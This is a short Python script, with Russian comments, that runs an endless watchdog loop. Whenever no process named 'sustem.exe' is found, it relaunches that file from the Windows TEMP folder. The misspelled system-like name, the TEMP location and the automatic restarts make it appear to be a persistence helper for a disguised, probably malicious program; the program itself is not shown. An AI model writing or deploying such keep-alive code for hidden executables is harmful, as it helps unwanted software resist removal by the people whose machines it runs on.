import psutil
import sys
import time
import os
from pathlib import Path

sys.setrecursionlimit(9999999)

def is_process_running(process_name):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                return True
        return False
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False

# Получаем путь к временной директории
tmp = Path(os.getenv('TEMP'))

# Создаем полный путь к файлу
file_path = tmp / 'sustem.exe'
def check():
    while True:  # Заменяем рекурсию циклом while
        try:
            proc_running = is_process_running("sustem.exe")
            if proc_running:
                print("всё ок!")
                time.sleep(2)
            else:
                print("Процесса нема!")
                # Запуск
                os.system(f'start {file_path} && exit')
                time.sleep(5)
        except Exception as e:  # Обрабатываем любые другие исключения
            print(f"Ошибка: {e}")
            time.sleep(5)  # Добавим задержку, чтобы не спамить ошибками

check()